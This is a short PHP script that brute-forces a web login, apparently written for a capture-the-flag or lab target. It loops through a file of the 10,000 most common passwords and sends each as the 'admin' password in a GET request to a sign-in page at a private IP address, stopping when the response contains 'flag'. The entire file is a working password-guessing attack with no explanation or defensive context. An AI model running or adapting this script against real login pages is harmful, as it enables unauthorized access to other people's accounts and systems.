<?php

$passwords = file("./10k-most-common.txt");

$i = 0;
$password_found = FALSE;
while ($i < 10000 AND $password_found === FALSE)
{
    $url = "http://192.168.1.23/index.php?page=signin&username=admin&password=".str_replace("\n", "", $passwords[$i])."&Login=Login";
    $ret = file_get_contents($url);
    if (strpos($ret, "flag") !== FALSE)
    {
        print('Password is "'.$passwords[$i].'" !');
        $password_found = TRUE;
    }
    else
        print('Password is not "'.$passwords[$i].'"');
    $i++;
}